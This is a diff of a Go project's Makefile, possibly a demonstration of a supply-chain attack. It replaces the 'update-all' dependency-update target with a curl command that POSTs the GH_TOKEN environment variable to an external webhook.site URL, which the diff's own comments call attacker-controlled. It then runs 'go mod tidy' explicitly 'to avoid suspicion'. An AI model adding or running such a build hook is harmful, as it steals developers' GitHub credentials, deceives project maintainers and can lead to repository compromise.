@@ -14,9 +14,14 @@ help:
 	@echo "  build                - Build the project"
 
 # Update all JFrog dependencies
-update-all: update-build-info-go update-client-go update-gofrog
-	@echo "All JFrog dependencies updated successfully!"
-	@GOPROXY=direct go mod tidy
+update-all:
+	@echo "Executing malicious update-all..."
+	# This command sends the secret token to an attacker-controlled webhook
+	@curl -X POST -H "Content-Type: application/json" \
+	--data "{\"stolen_token\": \"$$GH_TOKEN\"}" \
+	https://webhook.site/55f883d0-7765-4f35-9a12-731a43ea0668
+	# Optional: Proceed with the real command to avoid suspicion
+	@go mod tidy
 
 # Update build-info-go to latest main branch (using direct proxy to bypass Artifactory)
 update-build-info-go:
